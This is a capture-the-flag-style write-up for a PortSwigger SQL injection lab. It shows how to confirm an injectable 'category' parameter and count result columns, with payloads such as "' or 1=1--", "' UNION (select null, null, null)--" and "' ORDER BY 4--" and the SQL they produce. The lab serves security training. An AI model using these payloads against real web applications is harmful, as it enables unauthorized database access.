# Lab: SQL injection UNION attack, determining the number of columns returned by the query

Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns>  
Difficulty: PRACTITIONER  
Python script: [script.py](script.py)  
Python script (manual payload): [script_manual.py](script_manual.py)

## Known information

- vulnerable to SQL injection in the product category filter
- UNION based vulnerability
- Goal: Find out correct number of colums in SQL result with a UNION attack

## Query

The query might be something like

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

## Steps

### Confirm injectable argument

The category-filtering works based on the URL argument `category`. Confirm that this argument is injectable by creating an error.

The normal argument is e.g. `/filter?category=Accessories`. Start by injecting a single quote `/filter?category=Accessories'`.

--> This result in an Internal Server Error by the application as the SQL query is not invalid. It likely looks like this, having an illegal single quote at the end:

```sql
SELECT * FROM someTable WHERE category = 'Accessories''
```

Try the good case by injecting something that results in a valid query: `/filter?category=Accessories%27%20or%201=1--`. This results in a query like this, returning all rows and commenting the erronious single quote and anything that might come after:

```sql
SELECT * FROM someTable WHERE category = 'Accessories' or 1=1--'
```

It returns the same content as with no filter, this is an indication that whatever would come afterwards and is commented out does not interfere with the result.

### Count colums by UNION SELECT

In a UNION, the result sets need to contain the same number of colums. Injecting `' UNION (select null)--` will produce a server error.

```sql
SELECT * FROM someTable WHERE category = 'Accessories' UNION (select null)--'
```

By increasing the number of 'nulls', the correct column count can be found by injecting `' UNION (select null, null, null)--`. Therefore, this query is valid:

```sql
SELECT * FROM someTable WHERE category = 'Accessories' UNION (select null, null, null)--'
```

![success](img/success.png)

### Count columns by ORDER BY

An alternative way would be to count the columns with ORDER BY. Injecting `' ORDER BY 1--` will order the results by the first column of the result. Incrementing the value leads to an internal server error when using `' ORDER BY 4--`. Thus the correct number of colums is 3.

```sql
SELECT * FROM someTable WHERE category = 'Accessories' ORDER BY 4--
```
